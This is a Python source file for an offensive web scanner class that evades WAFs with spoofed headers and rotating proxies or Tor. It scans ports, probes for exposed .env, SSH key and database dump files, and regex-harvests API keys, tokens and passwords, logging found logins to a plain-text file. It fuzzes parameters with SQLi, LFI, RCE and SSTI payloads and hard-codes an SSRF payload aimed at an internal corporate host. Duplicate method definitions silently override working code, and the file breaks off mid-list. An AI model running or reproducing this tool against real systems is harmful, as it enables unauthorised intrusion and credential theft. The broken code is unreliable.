import asyncio
import aiohttp
import random
import string
import re
import os
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from PySide6.QtCore import QObject, Signal
import dns.resolver
import tldextract
import whois
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

try:
    from .models import Vulnerability, Target
    from .enumerator import SubdomainEnumerator, UberRecon, HackerTargetEnumerator
    from .crawler import WebCrawler
    from .payloads import Payloads, Indicators
    from .payloads import Payloads, Indicators
    from core.browser_scanner import BrowserScanner
    from .proxy_manager import ProxyManager
    from .dumper import CredentialDumper
except ImportError:
    from core.models import Vulnerability, Target
    from core.enumerator import SubdomainEnumerator, UberRecon, HackerTargetEnumerator
    from core.crawler import WebCrawler
    from core.payloads import Payloads, Indicators
    from core.payloads import Payloads, Indicators
    from core.browser_scanner import BrowserScanner
    from core.proxy_manager import ProxyManager
    from core.dumper import CredentialDumper

# Import CVEScanner globally (or handle import error properly if module missing)
try:
    from .cve_scanner import CVEScanner
except ImportError:
    from core.cve_scanner import CVEScanner

H1_USER = "MoisesVanti-sectest" 
SSRF_PAYLOAD = f"http://dca11-pra.prod.uber.internal:31084/{H1_USER}@wearehackerone.com"

class NexusScanner(QObject):
    finding_found = Signal(object)
    log_message = Signal(str)
    progress_updated = Signal(int)
    stats_updated = Signal(int, int, int) # total, critical, requests
    scan_finished = Signal()
    sensitive_data_found = Signal(str, str) # title, content
    payload_generated = Signal(str, str)  # url, script

    def __init__(self, targets: list[dict], deep_scan=False, bypass_mode=False, headless=True, proxychains=False, strict_validation=True, dynamic_timeout=False, ai_key=None, ai_model="llama3-70b-8192"):
        super().__init__()
        self.targets = targets
        self.deep_scan = deep_scan
        self.bypass_mode = bypass_mode
        self.headless = headless
        self.proxychains = proxychains
        self.strict_validation = strict_validation
        self.dynamic_timeout = dynamic_timeout
        self.ai_key = ai_key
        self.ai_model = ai_model or "llama3-70b-8192"
        self.is_running = False
        self.discovered_forms = [] # Initialize to empty list
        self.session = None
        self.ua = UserAgent()
        self.proxy_manager = ProxyManager()
        self.dumper = CredentialDumper()
        
        # AI Assistant
        self.ai_assistant = None
        if ai_key:
            from core.ai_assistant import AIAssistant
            self.ai_assistant = AIAssistant(ai_key, model=ai_model or "llama3-70b-8192")
            self.ai_assistant.log_message.connect(self.log_message.emit)
        
        # Stats
        self.total_findings = 0
        self.critical_findings = 0
        self.request_count = 0
        
        # Concurrency Control
        self.sem = asyncio.Semaphore(50) 

        self.sensitive_paths = [
            # Git & SCM
            ".git/config", ".git/HEAD", ".git/index", ".gitignore", ".gitlab-ci.yml",
            # Environment & Configs
            ".env", ".env.local", ".env.dev", ".env.prod", ".env.production",
            "config.php", "wp-config.php", "configuration.php", "LocalSettings.php",
            "config.json", "config.yml", "database.yml", "settings.py",
            "appsettings.json", "web.config",
            # Backups & Dumps
            "backup.sql", "dump.sql", "database.sql", "users.sql", "db_backup.sql",
            "backup.zip", "site.zip", "www.zip", "backup.tar.gz", "old.zip",
            # SSH & Keys
            "id_rsa", "id_dsa", ".ssh/id_rsa", ".ssh/authorized_keys", "server.key",
            # Logs & Debug
            "debug.log", "error.log", "access.log", "npm-debug.log", "phpinfo.php",
            "server-status", "trace.axd", "elmah.axd",
            # Framework Specific
            "composer.json", "composer.lock", "package.json", "package-lock.json",
            "requirements.txt", "Gemfile", "Gemfile.lock", "webpack.config.js",
            ".vscode/sftp.json", ".idea/workspace.xml", "docker-compose.yml",
            "Dockerfile", "Makefile", "Jenkinsfile"
        ]

    def get_headers(self):
        try:
            user_agent = self.ua.random
        except:
            user_agent = f"Nexus-Ultima-v20/{random.randint(100,999)}"

        headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        
        if self.bypass_mode:
            # ADVANCED HEADER SPOOFING
            spoofed_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers.update({
                "X-Forwarded-For": spoofed_ip,
                "X-Originating-IP": spoofed_ip,
                "X-Remote-IP": spoofed_ip,
                "X-Remote-Addr": spoofed_ip,
                "X-Client-IP": spoofed_ip,
                "X-Host": spoofed_ip,
                "X-Forwared-Host": spoofed_ip,
                "Referer": "https://www.google.com/",
                "X-Waf-Bypass": "true" # Sometimes works on weak configs
            })
            
        return headers
            
    async def analyze_js_files(self, url):
        """Crawls and mines JS files for secrets and endpoints."""
        try:
            status, content, _ = await self._safe_request('GET', url, headers=self.get_headers())
            if not content: return
            
            soup = BeautifulSoup(content, 'html.parser')
            scripts = [s.get('src') for s in soup.find_all('script') if s.get('src')]
            
            for script in scripts:
                if not script.startswith('http'):
                    base = url.split('?')[0].rstrip('/')
                    # Handle relative paths properly
                    if script.startswith('/'):
                        parsed = urlparse(url)
                        script_url = f"{parsed.scheme}://{parsed.netloc}{script}"
                    else:
                        script_url = f"{base}/{script}"
                else:
                    script_url = script

                # Filter external libs to save time (optional, but good for speed)
                if "jquery" in script_url or "bootstrap" in script_url or "google-analytics" in script_url:
                    continue

                status, js_content, _ = await self._safe_request('GET', script_url, headers=self.get_headers())
                if status == 200 and js_content:
                     js_text = js_content.decode('utf-8', errors='ignore')
                     
                     # Extract Secrets (Regex expanded)
                     self.extract_sensitive_data(js_text, script_url)
                     
                     # Extract Endpoints
                     endpoints = set(re.findall(r'["\'](/api/[a-zA-Z0-9_\-/]+|/v[0-9]/[a-zA-Z0-9_\-/]+)["\']', js_text))
                     if endpoints:
                          self.log_message.emit(f"<span style='color:#ffcc00'>[JS] Found {len(endpoints)} hidden endpoints in {os.path.basename(script_url)}</span>")
                          # Save endpoints evidence
                          self.save_evidence(script_url, "JS_Endpoints", "\n".join(endpoints))

        except Exception:
            pass

    async def check_takeover(self, domain):
         """Checks for Subdomain Takeover opportunities via CNAME analysis."""
         try:
             answers = dns.resolver.resolve(domain, 'CNAME')
             for rdata in answers:
                 cname = rdata.target.to_text().rstrip('.')
                 
                 # Known Takeover Fingerprints
                 fingerprints = {
                     "github.io": "There is no GitHub Pages site here",
                     "herokuapp.com": "Heroku | No such app",
                     "amazonaws.com": "The specified bucket does not exist",
                     "azurewebsites.net": "404 Web Site not found",
                     "cloudapp.net": "404 Web Site not found",
                     "wordpress.com": "Do you want to register"
                 }
                 
                 for service_domain, error_sig in fingerprints.items():
                     if service_domain in cname:
                         # Verify if it's dangling
                         # We need to make a request to the domain seeing if it returns the error
                         try:
                             async with self.session.get(f"http://{domain}", timeout=5) as r:
                                 content = await r.text()
                                 if error_sig in content:
                                      vuln = Vulnerability(target=domain, vuln_type="Subdomain Takeover", severity="CRITICAL", impact=f"Dangling CNAME to {cname}")
                                      self._emit_finding(vuln)
                                      self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: SUBDOMAIN TAKEOVER Possible on {domain} (-> {cname})</span>")
                         except:
                             pass
         except:
             pass

    async def mine_parameters(self, url):
        """Attempts to find hidden debug parameters."""
        params = ["debug", "test", "admin", "admin_mode", "show_errors", "source", "env"]
        
        # Determine baseline size
        base_status, base_content, _ = await self._safe_request('GET', url, headers=self.get_headers())
        base_len = len(base_content)
        
        for param in params:
             # Try ?param=true
             fuzz_url = f"{url}?{param}=true" if "?" not in url else f"{url}&{param}=true"
             status, content, _ = await self._safe_request('GET', fuzz_url, headers=self.get_headers())
             
             # Heuristic: Significant size change or 500/error
             if abs(len(content) - base_len) > 500 and status == 200:
                  self.log_message.emit(f"<span style='color:#ffcc00'>[?] Suspicious behavior with parameter '{param}' on {url}</span>")

    async def check_waf(self, url):
        """Detects WAF presence via headers."""
        try:
            # Fast check
            status, _, headers = await self._safe_request('GET', url, headers=self.get_headers())
            waf_signatures = {
                "Cloudflare": ["cf-ray", "__cfduid", "cf-cache-status"],
                "AWS WAF": ["x-amz-cf-id", "x-amzn-requestid"],
                "Akamai": ["akamai-origin-hop", "x-akamai-transformed"],
                "F5 BIG-IP": ["x-cnection", "bigip"],
                "Imperva": ["x-iinfo", "incap-ses"],
                "Sucuri": ["x-sucuri-id", "x-sucuri-cache"]
            }
            
            detected_waf = None
            headers_lower = {k.lower(): v for k, v in headers.items()}
            
            for waf, sigs in waf_signatures.items():
                if any(sig in headers_lower for sig in sigs):
                    detected_waf = waf
                    break
            
            if detected_waf:
                msg = f"<span style='color:#ff0055'>[!] WAF DETECTED: {detected_waf}</span>"
                self.log_message.emit(msg)
                if self.bypass_mode:
                     self.log_message.emit(f"<span style='color:#00ff9d'>[+] ATTEMPTING EVASION PROTOCOLS...</span>")
            else:
                 self.log_message.emit("<span style='color:#aaa'>[-] No common WAF Detected.</span>")
                 
        except Exception as e:
            pass
            
    async def scan_ports(self, hostname):
        """Scans top 100 critical ports with banner grabbing."""
        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Initiating Service Discovery (Top 100 Ports)...</span>")
        # Extended port list
        # Extended port list (Top 1000 + Critical Services)
        ports = list(range(20, 1025)) + [
            1433, 1521, 2082, 2083, 2086, 2087, 2095, 2096, 
            2222, 3306, 3389, 3690, 4000, 5000, 5432, 5601, 5900, 
            6000, 6379, 7000, 8000, 8001, 8008, 8080, 8081, 8443, 
            8888, 9000, 9090, 9200, 9300, 10000, 11211, 27017
        ]
        ports = sorted(list(set(ports))) # Remove duplicates
        
        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Scanning {len(ports)} ports (Standard 1000 + Critical)...</span>")
        open_ports = []
        
        async def check_port(port):
            try:
                fut = asyncio.open_connection(hostname, port)
                reader, writer = await asyncio.wait_for(fut, timeout=2.0)
                
                # Banner Grabbing attempt
                banner = ""
                try:
                    # Send bytes to trigger response for some protocols
                    if port not in [80, 443]:
                         writer.write(b"\r\n\r\n")
                         await writer.drain()
                         data = await asyncio.wait_for(reader.read(1024), timeout=1.5)
                         banner = data.decode('utf-8', errors='ignore').strip()
                except:
                    pass

                open_ports.append((port, banner))
                writer.close()
                await writer.wait_closed()
            except:
                pass

        # Batch scan
        batch_size = 100
        for i in range(0, len(ports), batch_size):
             batch = ports[i:i+batch_size]
             if not self.is_running: break
             await asyncio.gather(*[check_port(p) for p in batch])
        
        if open_ports:
            self.log_message.emit(f"<span style='color:#00ff9d'>[+] DISCOVERED {len(open_ports)} OPEN PORTS:</span>")
            for p, banner in sorted(open_ports, key=lambda x: x[0]):
                 service = "UNKNOWN"
                 if p == 80: service = "HTTP"
                 elif p == 443: service = "HTTPS"
                 elif p == 22: service = "SSH"
                 elif p == 21: service = "FTP"
                 elif p == 3306: service = "MYSQL"
                 
                 output = f"    - Port {p}/tcp OPEN ({service})"
                 if banner:
                      output += f" | Banner: {banner[:40]}..."
                 self.log_message.emit(f"<span style='color:#aaa'>{output}</span>")
        else:
            self.log_message.emit(f"<span style='color:#aaa'>[-] No common open ports found (Firewalled?).</span>")

    async def enumerate_subdomains(self, domain):
        """Queries crt.sh for real subdomain enumeration."""
        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Querying Certificate Transparency Logs (crt.sh)...</span>")
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        self.subdomains = set() # Initialize subdomains set
        
        for attempt in range(3):
            try:
                async with self.session.get(url, timeout=15) as r:
                    if r.status == 200:
                        data = await r.json()
                        subs = set()
                        for entry in data:
                            name_value = entry.get('name_value', '')
                            for sub in name_value.split('\n'):
                                if sub and not '*' in sub and sub != domain:
                                    subs.add(sub)
                        
                        if subs:
                            self.log_message.emit(f"<span style='color:#00ff9d'>[+] DISCOVERED {len(subs)} SUBDOMAINS (CRT.SH):</span>")
                            # Limit output to top 15 to avoid flood
                            for sub in list(subs)[:15]:
                                 self.log_message.emit(f"<span style='color:#aaa'>    - {sub}</span>")
                                 self.subdomains.add(sub)
                                 # Check Takeover on discover
                                 asyncio.create_task(self.check_takeover(sub))
                                 
                            if len(subs) > 15:
                                 self.log_message.emit(f"<span style='color:#aaa'>    - ... and {len(subs)-15} more.</span>")
                            
                            # Save subdomains evidence
                            self.save_evidence(f"https://{domain}", "Subdomain_Recon_CRT", "\n".join(sorted(subs)))
                        else:
                            self.log_message.emit("<span style='color:#aaa'>[-] No subdomains found in CT logs.</span>")
                        
                        return # Success found (either subs or empty list but valid response)
                    else:
                        self.log_message.emit(f"<span style='color:#ff0055'>[!] CRT.SH API request failed (Status: {r.status}). Retrying ({attempt+1}/3)...</span>")
            except Exception:
                 if attempt < 2:
                      await asyncio.sleep(2)
                 else:
                      self.log_message.emit("<span style='color:#aaa'>[!] Failed to contact CRT.SH after 3 attempts. Skipping.</span>")

    async def check_balance_tampering(self, url):
        """Checks for API vulnerabilities related to balance/wallet manipulation."""
        # This is a heuristic check for endpoints that might accept 'amount' params
        payloads = [
            ("amount", "-1000"), # Negative value
            ("price", "0.01"), # Price manipulation
            ("credits", "999999"), # Overflow
            ("wallet_id", "' OR 1=1 --") # SQLi on ID
        ]
        
        base = url.split("?")[0]
        # Common API paths to check
        api_paths = ["/api/v1/wallet", "/api/balance", "/api/user/update", "/api/payment"]
        
        parsed = urlparse(url)
        root_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for path in api_paths:
             target = f"{root_url}{path}"
             for param, val in payloads:
                 # Construct JSON body attempt
                 json_body = {param: val}
                 try:
                     async with self.session.post(target, json=json_body, headers=self.get_headers(), timeout=3) as r:
                         if r.status in [200, 201]:
                             content = await r.read()
                             if b"success" in content or b"updated" in content:
                                  vuln_name = "Potential Logic Flaw (Balance Tampering)"
                                  self.log_message.emit(f"<span style='color:#ff0055'>[!] CRITICAL: {vuln_name} at {target}</span>")
                                  self.save_evidence(target, vuln_name, content)
                 except:
                     pass

    def extract_sensitive_data(self, content, source_url):
        if not content: return
        
        # 0. Check for Data Dumps (SQL, ENV, Shadow, etc)
        try:
            if self.dumper:
                found, dtype, dmsg = self.dumper.analyze(source_url, content)
                if found:
                    self.log_message.emit(f"<span style='color:#ff00ff; font-weight:bold'>[★] DATA DUMP FOUND: {dtype}</span>")
                    self.log_message.emit(f"<span style='color:#aaa'>    - {dmsg}</span>")
                    vuln = Vulnerability(target=source_url, vuln_type=f"Data Dump ({dtype})", severity="CRITICAL", impact=dmsg)
                    self._emit_finding(vuln)
        except Exception:
            pass

        patterns = {
            # Cloud & Infrastructure
            "AWS Access Key ID": r"AKIA[0-9A-Z]{16}",
            "AWS Secret Access Key": r"(?i)aws_?secret_?access_?key['\"]?\s*[:=]\s*['\"]?([A-Za-z0-9\/+=]{40})",
            "Google API Key": r"AIza[0-9A-Za-z-_]{35}",
            "Google OAuth": r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com",
            "Azure Storage Key": r"[a-z0-9]+.blob.core.windows.net",
            "Heroku API Key": r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}",
            
            # SaaS & APIs
            "Slack Token": r"xox[baprs]-([0-9a-zA-Z]{10,48})",
            "Slack Webhook": r"https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}",
            "Stripe Secret": r"sk_live_[0-9a-zA-Z]{24}",
            "Stripe Publishable": r"pk_live_[0-9a-zA-Z]{24}",
            "Facebook Access Token": r"EAACEdEose0cBA[0-9A-Za-z]+",
            "GitHub Token": r"gh[pousr]_[A-Za-z0-9_]{36,255}",
            "Twilio API Key": r"SK[0-9a-fA-F]{32}",
            "Mailgun API Key": r"key-[0-9a-zA-Z]{32}",
            "PayPal Braintree": r"access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}",
            
            # Private Keys & Auth
            "Private Key": r"-----BEGIN [A-Z]+ PRIVATE KEY-----",
            "SSH Private Key": r"-----BEGIN OPENSSH PRIVATE KEY-----",
            
            # Generic Secrets (High False Positive Potential, handled carefully)
            "Generic API Key": r"(?i)(api_key|apikey|access_token|auth_token)['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{32,64})['\"]?",
            "Generic Password": r"(?i)(password|passwd|pwd|secret)['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9@#$%^&*_\-]{8,64})['\"]?",
            "Authorization Header": r"(?i)Authorization:\s*(Bearer|Basic)\s+([a-zA-Z0-9._\-]+)",
            
            # PII
            "Email Address": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
            "IP Address (Internal)": r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.1[6-9]\.\d{1,3}\.\d{1,3}|172\.2[0-9]\.\d{1,3}\.\d{1,3}|172\.3[0-1]\.\d{1,3}\.\d{1,3})\b"
        }
        for title, regex in patterns.items():
            matches = re.findall(regex, content)
            for match in matches:
                if isinstance(match, tuple):
                    # If multiple groups (key, value), join them for context
                    val_str = " | ".join(match)
                else:
                    val_str = str(match)

                # SHOW FULL DATA (No Truncation)
                display_val = val_str 
                self.sensitive_data_found.emit(title, display_val)
                # Auto-save sensitive data evidence
                self.save_evidence(source_url, f"Sensitive_Data_{title}", content)
        
        # Check for credential pairs (Email/User + Password)
        self._scan_for_credentials(content, source_url)

    def _scan_for_credentials(self, content, url):
        """Heuristic scan for credential pairs."""
        # 1. Connection Strings (High Confidence)
        # mysql://user:pass@host
        auth_uris = re.findall(r'(?:mysql|postgres|mongodb|redis|amqp)://([a-zA-Z0-9_]+:[a-zA-Z0-9_@#$%^&*]+)@', content)
        for cred in auth_uris:
             self._log_credential(url, "Service Auth", cred)

        # 2. JSON/Config Proximity Check (Medium Confidence)
        # Look for "email": "..." ... "password": "..."
        if len(content) < 50000: # Limit heavy processing
             # Normalize simple quotes
             text = content.replace("'", '"')
             
             # Regex for "key": "value"
             duplicates = set()
             
             # Find "email" or "username" fields
             user_matches = list(re.finditer(r'"(?:email|username|user|login)"\s*:\s*"([^"]+)"', text, re.IGNORECASE))
             pass_matches = list(re.finditer(r'"(?:password|passwd|pwd|secret)"\s*:\s*"([^"]+)"', text, re.IGNORECASE))
             
             for u in user_matches:
                  for p in pass_matches:
                       # Check distance (e.g., within 200 chars)
                       dist = abs(u.start() - p.start())
                       if dist < 200:
                            password = p.group(1)
                            # ENTROPY ANALYSIS
                            entropy = self._calculate_entropy(password)
                            quality = "LOW (Probable Placeholder)"
                            if entropy > 4.0:
                                 quality = "HIGH (Complex/Real)"
                            elif entropy > 3.0:
                                 quality = "MEDIUM"
                            
                            pair = f"{u.group(1)}:{password} | Quality: {quality} (Entropy: {entropy:.2f})"
                            
                            if pair not in duplicates:
                                 # Only log Medium+ to avoid noise if desired, or log all with tags
                                 self._log_credential(url, f"Possible Login [{quality}]", pair)
                                 duplicates.add(pair)

    def _calculate_entropy(self, text):
        """Calculates Shannon Entropy to determine string randomness."""
        import math
        if not text: return 0
        entropy = 0
        for x in range(256):
            p_x = float(text.count(chr(x)))/len(text)
            if p_x > 0:
                entropy += - p_x * math.log(p_x, 2)
        return entropy

    def _log_credential(self, url, ctype, creds):
        """Saves credential to the master logins found file."""
        log_entry = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [{ctype}] {creds} | Source: {url}\n"
        
        # Save to global logins file
        file_path = os.path.join("scans", "logins_found.txt")
        with open(file_path, "a", encoding="utf-8") as f:
             f.write(log_entry)
        
        self.log_message.emit(f"<span style='color:#ff00ff; font-weight:bold'>[★] LOGIN FOUND: {creds} ({ctype}) saved to logins_found.txt</span>")

    async def _safe_request(self, method, url, **kwargs):
        """Wrapper over aiohttp to handle timeouts, dynamic scaling, and failures gracefully."""
        if not self.session: return 0, b"", {}
        
        # Override baseline timeout with Dynamic Scaling if enabled
        base_timeout = kwargs.get('timeout', 15)
        if self.dynamic_timeout:
             # Scale timeout up by 30 seconds for resiliency on slow WAFs
             base_timeout += 30
             
        retries = 3 if self.bypass_mode else 2
        for attempt in range(retries):
            try:
                # We don't want to hang forever, but dynamic allows us to wait
                timeout = aiohttp.ClientTimeout(total=base_timeout)
                
                # Smart Jitter on proxy mode to avoid ratelimits
                if self.bypass_mode and hasattr(self, 'current_jitter_enabled'):
                     import random
                     await asyncio.sleep(random.uniform(0.5, 2.5))

                proxy = None
                if self.proxychains:
                    proxy = "socks5://127.0.0.1:9050"
                elif self.bypass_mode:
                    proxy = self.proxy_manager.get_proxy()
                    if not proxy and attempt == 0:
                         # Try to wait a bit if pool is empty
                         await asyncio.sleep(2)
                         proxy = self.proxy_manager.get_proxy()
                
                if method == 'GET':
                    async with self.session.get(url, proxy=proxy, timeout=timeout, **kwargs) as r:
                         self.request_count += 1
                         if self.request_count % 10 == 0:
                             self.stats_updated.emit(self.total_findings, self.critical_findings, self.request_count)
                         return r.status, await r.read(), r.headers
                elif method == 'POST':
                    async with self.session.post(url, proxy=proxy, timeout=timeout, **kwargs) as r:
                         self.request_count += 1
                         return r.status, await r.read(), r.headers

            except (aiohttp.ClientPayloadError, aiohttp.ServerDisconnectedError, aiohttp.ClientConnectorError) as e:
                # Connection stability errors - wait and retry
                if attempt < retries - 1:
                    await asyncio.sleep(1 * (attempt + 1))
                    continue
                
            except Exception as e:
                # If proxy failed, remove it
                if self.bypass_mode and proxy:
                    self.proxy_manager.remove_proxy(proxy)
                
                if attempt == retries - 1:
                    return 0, b"", {}
                await asyncio.sleep(0.5)
        return 0, b"", {}

    def resolve_domain(self, hostname):
        """Uses dnspython, tldextract, and whois for comprehensive recon."""
        try:
            # DNS Resolution
            answers = dns.resolver.resolve(hostname, 'A')
            ips = [r.to_text() for r in answers]
            
            # TLD Extraction
            ext = tldextract.extract(hostname)
            domain_info = f"{ext.domain}.{ext.suffix}"
            
            # WHOIS Lookup (sync, might block slightly, but minimal impact in thread)
            try:
                w = whois.whois(domain_info)
                registrar = w.registrar or "Unknown"
                creation_date = w.creation_date
                if isinstance(creation_date, list): creation_date = creation_date[0]
                self.log_message.emit(f"<span style='color:#aaa'>    - Registrar: {registrar} | Created: {creation_date}</span>")
            except Exception:
                pass
                
            return ips
        except:
            return []

    async def analyze_forms(self, url, content):
        """Uses BeautifulSoup to find forms and potential vulnerabilities."""
        try:
            soup = BeautifulSoup(content, 'html.parser')
            forms = soup.find_all('form')
            
            if forms:
                self.log_message.emit(f"<span style='color:#00f3ff'>[INFO] Found {len(forms)} forms on {url}</span>")
                # Store for Auth Bypass Engine
                if not hasattr(self, 'discovered_forms'): self.discovered_forms = []
                self.discovered_forms.extend(forms)
                
            for form in forms:
                action = form.get('action') or url
                method = form.get('method', 'get').upper()
                inputs = form.find_all('input')
                
                # Log form details for the user
                input_names = [i.get('name') for i in inputs if i.get('name')]
                if input_names:
                     self.log_message.emit(f"<span style='color:#aaa'>    - Form ({method}) to {action}: inputs={input_names}</span>")
                
                # Check for password fields (Basic heuristic)
                for inp in inputs:
                    if inp.get('type') == 'password':
                        self.log_message.emit(f"<span style='color:#ffcc00'>    [!] Login Form Detected! Target: {action}</span>")
                        
        except Exception as e:
            # Don't crash on soup errors
            pass

    async def analyze_js_files(self, url):
        """Analyzes JS files for secrets (Stub to prevent crash if not implemented)."""
        # This is largely handled by the Crawler + Asset Analysis phase now, 
        # but kept here for the detect_tech call flow.
        pass

    async def fuzz_parameters(self, url, tech_stack):
        """Fuzzes URL parameters for common vulnerabilities using massive payload lists."""
        parsed = urlparse(url)
        if not parsed.query: return
        
        params = parse_qs(parsed.query)
        base_url = url.split('?')[0]
        
        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Fuzzing Parameters on {base_url} with Extended Payload Database...</span>")
        
        # Use centralized massive payload lists
        # Format: Type -> (Payload List, Indicator List)
        # Note: XSS handled specially via reflection
        payload_groups = {
            "SQLi": (Payloads.SQLI, Indicators.SQLI),
            "LFI": (Payloads.LFI, Indicators.LFI),
            "RCE": (Payloads.RCE, Indicators.RCE),
            "SSTI": (Payloads.SSTI, Indicators.SSTI),
            "ProtoPollution": (Payloads.PROTO_POLLUTION, ["Object", "Array"])
        }

        # XSS Check separately (reflection based)
        for param, values in params.items():
            # 1. Check XSS (Reflection)
            for payload in Payloads.XSS:
                try:
                    # Construct fuzzed URL
                    fuzzed_query = urlencode({p: (values[0] if p != param else payload) for p in params})
                    fuzzed_url = f"{base_url}?{fuzzed_query}"
                    
                    status, content, _ = await self._safe_request('GET', fuzzed_url)
                    text_content = content.decode('utf-8', errors='ignore')
                    
                    if payload in text_content:
                         # Simple reflection check
                         vuln = Vulnerability(target=url, vuln_type="Reflected XSS", severity="High", impact=f"Payload reflected in {param}")
                         self.finding_found.emit(vuln)
                         self.log_message.emit(f"<span style='color:#ff0055'>[!] XSS FOUND on parameter '{param}'</span>")
                         break # Stop after one XSS found
                except: pass

            # 2. Check Other Vulns (Indicator based)
            for v_type, (p_list, indicators) in payload_groups.items():
                for payload in p_list:
                    try:
                        fuzzed_query = urlencode({p: (values[0] if p != param else payload) for p in params})
                        fuzzed_url = f"{base_url}?{fuzzed_query}"
                        
                        status, content, _ = await self._safe_request('GET', fuzzed_url)
                        text_content = content.decode('utf-8', errors='ignore')
                        
                        # Check indicators
                        for ind in indicators:
                            if ind in text_content:
                                 # Found!
                                 vuln = Vulnerability(target=url, vuln_type=v_type, severity="Critical", impact=f"Indicator '{ind}' found with payload: {payload[:20]}...")
                                 self.finding_found.emit(vuln)
                                 self.log_message.emit(f"<span style='color:#ff0055'>[!] {v_type} DETECTED on parameter '{param}' (Indicator: {ind})</span>")
                                 break # Stop checking this type for this param if found
                        else:
                            continue
                        break # Break outer loop (payloads) if inner loop (indicators) broke
                    except: pass

    async def detect_tech(self, url):
        status, content, headers = await self._safe_request('GET', url, headers=self.get_headers(), timeout=5)
        text_content = content.decode('utf-8', errors='ignore')
        self.extract_sensitive_data(text_content, url)
        await self.analyze_forms(url, text_content)
        await self.analyze_js_files(url) 
        
        tech_stack = []
        server = headers.get('Server', '').lower()
        powered = headers.get('X-Powered-By', '').lower()
        
        if 'php' in powered or 'php' in server: tech_stack.append('php')
        if 'asp' in powered or 'iis' in server: tech_stack.append('asp')
        if 'nginx' in server: tech_stack.append('nginx')
        if 'express' in powered or 'node' in powered: tech_stack.append('node')
        
        return tech_stack

    def _validate_content(self, path, content):
        """Validates content to STRICTLY prevent HTML soft-404s from being saved as evidence."""
        if not content: return False
        
        # Convert snippet to lower for case-insensitive checking
        header = content[:1500].lower()
        
        # STRONG indicators of HTML/SPA (React, Vue, Vite, etc)
        spa_indicators = [
            b"<!doctype html", b"<html", b"<body", b"<div id=\"root\"", 
            b"<div id=\"app\"", b"vite-plugin-pwa", b"react", b"vue", 
            b"angular", b"nextjs"
        ]
        
        # Check if it looks like a webpage
        is_webpage = any(ind in header for ind in spa_indicators)

        if path.endswith(".sql"):
            # SQL MUST have SQL keywords and MUST NOT be a webpage
            sql_keywords = [b"insert into", b"create table", b"drop table", b"select ", b"values (", b"-- dumping data"]
            has_sql = any(k in header for k in sql_keywords)
            return has_sql and not is_webpage
            
        if path.endswith(".env"):
            # Env MUST have key=value pairs and MUST NOT be a webpage
            has_assign = b"=" in content and b"\n" in content
            return has_assign and not is_webpage
            
        if path.endswith(".git/config"):
            return b"[core]" in content or b"[remote" in content
            
        if path.endswith("id_rsa"):
            return b"PRIVATE KEY" in content
            
        if path.endswith(".yml") or path.endswith(".yaml"):
            return b":" in content and not is_webpage
            
        if path.endswith(".php"):
             if "phpinfo" in path:
                 return b"phpinfo()" in content or b"PHP Version" in content
             # For config.php, if it's executable code (<?php), it's valid finding
             if b"<?php" in content: return True
             return False
        
        # Default: If it looks like a webpage, reject it (unless we are looking for a webpage?)
        if is_webpage: return False
        
        return True

    async def check_sensitive_files(self, url):
        base_url = url.rstrip('/')
        tasks = []

        async def check_path(path):
            full_url = f"{base_url}/{path}"
            status, content, _ = await self._safe_request('GET', full_url, headers=self.get_headers(), allow_redirects=False, timeout=5)
            
            if status == 200:
                if not self._validate_content(path, content):
                    return

                text_content = content.decode('utf-8', errors='ignore')
                self.extract_sensitive_data(text_content, full_url)
                
                vuln_name = "Sensitive File Exposure"
                if path == ".env" and b"APP_KEY" in content: vuln_name = "Critical .env Exposure"
                
                vuln = Vulnerability(target=full_url, vuln_type=vuln_name, severity="CRITICAL", impact=f"Exposed {path}")
                self._emit_finding(vuln)
                self.log_message.emit(f"<span style='color:#ff0055'>[!] VULNERABILITY: {vuln_name} at {full_url}</span>")
                
                # Auto-save critical file evidence (EXACT BYTES)
                self.save_evidence(full_url, vuln_name, content)

        for path in self.sensitive_paths: tasks.append(check_path(path))
        for i in range(0, len(tasks), 10):
            if not self.is_running: break
            await asyncio.gather(*tasks[i:i+10])

    async def fuzz_parameters(self, url, tech_stack):
        """Fuzzes URL parameters for common vulnerabilities using massive payload lists."""
        parsed = urlparse(url)
        if not parsed.query: return
        
        params = parse_qs(parsed.query)
        base_url = url.split('?')[0]
        
        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Fuzzing Parameters on {base_url} with Extended Payload Database...</span>")
        
        # Use centralized massive payload lists
        # Format: Type -> (Payload List, Indicator List)
        # Note: XSS handled specially via reflection
        payload_groups = {
            "SQLi": (Payloads.SQLI, Indicators.SQLI),
            "LFI": (Payloads.LFI, Indicators.LFI),
            "RCE": (Payloads.RCE, Indicators.RCE),
            "SSTI": (Payloads.SSTI, Indicators.SSTI),
            "ProtoPollution": (Payloads.PROTO_POLLUTION, ["Object", "Array"])
        }
        
        # Heuristic Mode Expansion
        if self.heuristic_mining:
             self.log_message.emit(f"<span style='color:#ff0055'>[HEURISTIC] Injecting Deep Time-based Blind SQLi & DOM Closures on {len(params)} parameters!</span>")
             deep_sqli = [
